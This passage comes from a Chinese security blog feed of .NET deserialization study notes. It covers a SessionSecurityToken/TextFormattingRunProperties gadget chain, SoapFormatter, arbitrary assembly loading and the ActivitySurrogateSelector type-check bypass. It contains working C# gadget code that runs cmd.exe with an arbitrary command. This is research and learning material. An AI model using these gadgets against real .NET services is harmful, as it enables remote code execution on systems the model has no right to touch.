WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;KeyExpiryTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;ClaimsPrincipal&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Identities&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Identity&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;BootStrapToken&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteValue(B64Payload); <span class="comment">// This is where the payload is</span></span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.Flush();</span><br><span class="line"></span><br><span class="line">                stream.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Console.WriteLine(Encoding.ASCII.GetString(stream.ToArray()));</span></span><br><span class="line"></span><br><span class="line">                info.AddValue(<span class="string">&quot;SessionToken&quot;</span>, stream.ToArray());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">WriteElementContentAsInt64</span>(<span class="params">XmlDictionaryWriter writer, String localName, String ns, <span class="built_in">long</span> <span class="keyword">value</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            writer.WriteStartElement(localName, ns);</span><br><span class="line">            writer.WriteValue(<span class="keyword">value</span>);</span><br><span class="line">            writer.WriteEndElement();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">WriteElementStringAsUniqueId</span>(<span class="params">XmlDictionaryWriter writer, String localName, String ns, <span class="built_in">string</span> id</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            writer.WriteStartElement(localName, ns);</span><br><span class="line">            writer.WriteValue(id);</span><br><span class="line">            writer.WriteEndElement();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p><img src="../images/image-20240306144310027.png" alt="image-20240306144310027"></p><p><img src="../images/image-20240306144327778.png" alt="image-20240306144327778"></p><p>在SessionSecurityToken类的构造反序列化函数中有个ReadPrincipal函数   我们跟进</p><p><img src="../images/image-20240306144407446.png" alt="image-20240306144407446"></p><p>发现其调用了这个函数ReadIdentities  我们再次跟进</p><p><img src="../images/image-20240306144439645.png" alt="image-20240306144439645"></p><p>再次跟进又发现了其ReadIdentity函数  我们再次跟进</p><p><img src="../images/image-20240306144526674.png" alt="image-20240306144526674"></p><p>该方法中将BootstrapToken标签中的内容base64解码通过binaryformatter反序列化  思路清晰了  那么我们就只需要在其序列化的时候  调用GetObjectData函数  来给这些参数赋值  使其能成功调用到这些函数  并走到最后反序列化处</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LosFormatter&quot;&gt;&lt;a href=&quot;#LosFormatter&quot; class=&quot;headerlink&quot; title=&quot;LosFormatter&quot;&gt;&lt;/a&gt;LosFormatter&lt;/h2&gt;&lt;p&gt;LosFormatter一般用于序列化存储视图流状态，多用于</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-05</title>
    <link href="https://ke1nys.github.io/posts/a396de2e.html"/>
    <id>https://ke1nys.github.io/posts/a396de2e.html</id>
    <published>2024-02-29T07:01:43.000Z</published>
    <updated>2024-03-04T09:27:21.336Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md</a></p><p><a href="https://boogipop.com/2024/02/28/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/#0-1-ASP-NET-%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD">https://boogipop.com/2024/02/28/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/#0-1-ASP-NET-%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD</a></p><h2 id="Net任意类加载"><a href="#Net任意类加载" class="headerlink" title=".Net任意类加载"></a>.Net任意类加载</h2><p>在学习这个<code>SoapFormatter</code>类之前  我们先学习一下这个任意类加载   其实和java是一样的   java中编译的class对应这里的dll</p><p><strong>calc.cs</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ExpClassLibrary</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ExpClass</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ExpClass</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            MessageBox.Show(<span class="string">&quot;ExpClass DLL loaded successfully!&quot;</span>, <span class="string">&quot;DLL Loaded&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Information);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译dll命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csc.exe /target:library /out:calc.dll calc.cs</span><br></pre></td></tr></table></figure><p>csharp里类编译后会变成dll文件，那么我们同样的也可以读取dll文件的字节流，通过Assembly.Load方法去加载，获取到的是一个assembly对象，通过gettypes获取dll内所有的类型，这里当然只有一个类型，然后通过<code>Activator.CreateInstance</code>实例化对象触发恶意方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication2</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            var assembly = Assembly.Load(File.ReadAllBytes(&quot;C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\ExpClass.dll&quot;));</span><br><span class="line">            // var calculatorType = assembly.GetType(&quot;CalcLibrary.Calculator&quot;);</span><br><span class="line">            // var calculator = Activator.CreateInstance(calculatorType);</span><br><span class="line">            // var method = calculatorType.GetMethod(&quot;ShowPopup&quot;);</span><br><span class="line">            // method.Invoke(calculator, null);</span><br><span class="line">            var types = assembly.GetTypes();</span><br><span class="line">            Activator.CreateInstance(types[0]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304164049449.png" alt="image-20240304164049449"></p><h2 id="SoapFormatter"><a href="#SoapFormatter" class="headerlink" title="SoapFormatter"></a>SoapFormatter</h2><p>SoapFormatter类似XmlSerializer，用于生成基于xml的soap数据流，命名空间位于System.Runtime.Serialization.Formatters.Soap。</p><p><strong>demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span> =&gt; age; <span class="keyword">set</span> =&gt; age = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span> =&gt; name; <span class="keyword">set</span> =&gt; name = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SayHello</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;hello from SayHello&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SoapFormatter soapFormatter = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Age = <span class="number">10</span>;</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream stream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                soapFormatter.Serialize(stream,person);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">string</span> soap = Encoding.UTF8.GetString(stream.ToArray());</span><br><span class="line">                Console.WriteLine(soap);</span><br><span class="line"></span><br><span class="line">                stream.Position = <span class="number">0</span>;</span><br><span class="line">                Person p = (Person)soapFormatter.Deserialize(stream);</span><br><span class="line">                Console.WriteLine(p.Name);</span><br><span class="line">                p.SayHello();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;SOAP-ENV:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmls</span><br><span class="line">oap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:clr=&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot; SOAP-EN</span><br><span class="line">V:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">&lt;a1:Person id=&quot;ref-1&quot; xmlns:a1=&quot;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/ConsoleApplication2%2C%20Version%3D1.0.0.0%2C%20Culture%3Dne</span><br><span class="line">utral%2C%20PublicKeyToken%3Dnull&quot;&gt;</span><br><span class="line">&lt;age&gt;10&lt;/age&gt;</span><br><span class="line">&lt;name id=&quot;ref-3&quot;&gt;jack&lt;/name&gt;</span><br><span class="line">&lt;/a1:Person&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br><span class="line"></span><br><span class="line">jack</span><br><span class="line">hello from SayHello</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实看起来和xaml差不多</p><p><img src="../images/image-20240229154027957.png" alt="image-20240229154027957"></p><p>和其他序列化类一样  都是继承这两个接口  并且有代理器选择等等</p><h2 id="ActivitySurrogateSelector"><a href="#ActivitySurrogateSelector" class="headerlink" title="ActivitySurrogateSelector"></a>ActivitySurrogateSelector</h2><p>这个类一看名字就知道是个代理器  代理器是啥和使用方法在外面的序列化01就讲过了  这里就不多赘述了</p><p>简单来讲其就是可以让一个本不可以序列化的类进行序列化</p><p><strong>demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> name</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">PersonSerializeSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            info.AddValue(<span class="string">&quot;Name&quot;</span>, p.Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">SetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            p.Name = info.GetString(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            SoapFormatter fmt = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">            ss.AddSurrogate(<span class="keyword">typeof</span>(Person), <span class="keyword">new</span> StreamingContext(StreamingContextStates.All), <span class="keyword">new</span> PersonSerializeSurrogate());</span><br><span class="line">            fmt.SurrogateSelector = ss;</span><br><span class="line">            fmt.Serialize(stm, <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>));</span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line">            Console.WriteLine(fmt.Deserialize(stm));</span><br><span class="line"></span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">var</span> fmt2 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304143050997.png" alt="image-20240304143050997"></p><p><img src="../images/image-20240304143243374.png" alt="image-20240304143243374"></p><p>这里的话输出jack是因为我们使用的第一个formatter是设置了代理器的  下面报错的异常是因为第二个formatter没有设置代理  并在在真实环境中  对方的系统用的formatter也不会设置代理器  </p><p>再来看这条链，牛就牛在发现了<a href="https://msdn.microsoft.com/en-us/library/system.workflow.componentmodel.serialization.activitysurrogateselector(v=vs.110">ActivitiySurrogateSelector</a>.aspx)这个类中的ObjectSurrogate，通过这个内部类我们可以反序列化任何对象。看一下这个类的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line">namespace SoapDeserialization</span><br><span class="line">&#123;</span><br><span class="line">    class NonSerializable</span><br><span class="line">    &#123;</span><br><span class="line">        private string _text;</span><br><span class="line"></span><br><span class="line">        public NonSerializable(string text)</span><br><span class="line">        &#123;</span><br><span class="line">            _text = text;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public override string ToString()</span><br><span class="line">        &#123;</span><br><span class="line">            return _text;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Custom serialization surrogate</span><br><span class="line">    class MySurrogateSelector : SurrogateSelector</span><br><span class="line">    &#123;</span><br><span class="line">        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)</span><br><span class="line">        &#123;</span><br><span class="line">            selector = this;</span><br><span class="line">            if (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;);</span><br><span class="line">                return (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line">            return base.GetSurrogate(type, context, out selector);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;, &quot;true&quot;);</span><br><span class="line">            SoapFormatter fmt = new SoapFormatter();</span><br><span class="line">            MemoryStream stm = new MemoryStream();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            fmt.SurrogateSelector = new MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, new NonSerializable(&quot;Hello World!&quot;));</span><br><span class="line">            stm.Position = 0;</span><br><span class="line"></span><br><span class="line">            var fmt2 = new SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304143828496.png" alt="image-20240304143828496"></p><p>没有报错   正常运行  </p><p>NonSerializable仍然没有标记Serializable，但是在获取代理器的时候返回了一个ActivitySurrogateSelector+ObjectSurrogate的实例，使得NonSerializable类仍旧可以被序列化。并且fmt2并没有指定代理选择器的前提下，仍然可以正常反序列化对象，这样就解决了上文的限制。</p><p>我们跟进ActivitySurrogateSelector中的ObjectSurrogate类  这个是ActivitySurrogateSelector的一个内部类</p><p><img src="../images/image-20240304150013131.png" alt="image-20240304150013131"></p><p>重点是在这里  它做了一段处理<code>info.SetType(typeof (ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</code>它将我们序列化的类的属性设置为了ObjectSerializedRef，我们再看看这个类。</p><p><img src="../images/image-20240304150123110.png" alt="image-20240304150123110"></p><p>这个类还是可以进行序列化和反序列化的   这就说明了  我们现在可以使用该类来将本不可以进行反序列化的类进行反序列化了  这样久避免了目标中的formatter没有设置代理从而不能反序列化的问题 这样我们的攻击面也更广了</p><h2 id="LINQ"><a href="#LINQ" class="headerlink" title="LINQ"></a>LINQ</h2><p>LINQ是C#中的语言集成查询语法，像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">    var word = &quot;hello from linq.&quot;;</span><br><span class="line">    var words = word.Split(&#x27; &#x27;);</span><br><span class="line">    var q1 = from s in words</span><br><span class="line">        where s.ToLower().Contains(&#x27;o&#x27;)</span><br><span class="line">        select s;</span><br><span class="line">    Console.WriteLine(q1);</span><br><span class="line">    foreach (var item in q1)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(item);</span><br><span class="line">    &#125;</span><br><span class="line">    Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有点像Codeql的查询语法  输出</p><p><img 